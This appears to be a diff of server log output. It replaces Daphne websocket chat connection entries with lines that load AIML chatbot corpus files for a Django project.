-2019-04-05 06:37:46,110 INFO     Killed 2 pending application instances
-124.160.57.70:56993 - - [05/Apr/2019:06:33:18] "WSCONNECTING /ws/chat/1/" - -
-124.160.57.70:56993 - - [05/Apr/2019:06:33:19] "WSCONNECT /ws/chat/1/" - -
-124.160.57.70:56995 - - [05/Apr/2019:06:33:25] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:56995 - - [05/Apr/2019:06:33:25] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:56995 - - [05/Apr/2019:06:36:54] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:57313 - - [05/Apr/2019:06:36:54] "WSCONNECTING /ws/chat/YS19032700/" - -
-124.160.57.70:57313 - - [05/Apr/2019:06:36:54] "WSCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:57313 - - [05/Apr/2019:06:37:46] "WSDISCONNECT /ws/chat/YS19032700/" - -
-124.160.57.70:56993 - - [05/Apr/2019:06:37:46] "WSDISCONNECT /ws/chat/1/" - -
-2019-04-05 06:37:47,388 INFO     Starting server at tcp:port=8001:interface=0.0.0.0
-2019-04-05 06:37:47,389 INFO     HTTP/2 support not enabled (install the http2 and tls Twisted extras)
-2019-04-05 06:37:47,389 INFO     Configuring endpoint tcp:port=8001:interface=0.0.0.0
-2019-04-05 06:37:47,390 INFO     Listening on TCP address 0.0.0.0:8001
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...
